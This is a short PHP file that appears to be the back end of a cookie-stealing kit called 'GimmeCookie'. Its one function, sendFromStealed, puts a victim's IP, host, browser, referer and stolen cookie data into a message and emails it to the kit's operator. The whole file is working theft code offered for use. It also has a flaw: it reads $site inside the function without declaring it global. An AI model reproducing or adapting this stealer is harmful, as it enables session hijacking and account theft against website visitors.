<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

function sendFromStealed($ip, $host, $navigator, $date, $time, $referer, $data)
{
	$st = '';
	// Write stealed data into the string array
	$st .= "IP: $ip\n";
	$st .= "HOST: $host\n";
	$st .= "Browser: $navigator\n";
	$st .= "Date: $date\n";
	$st .= "Time: $time\n";
	$st .= "Referer: $referer\n";
	$st .= "Data: $data";
	// Send recieved data on e-mail
	mail($site['mail'], "You recieved new cookies from $ip", $st);
}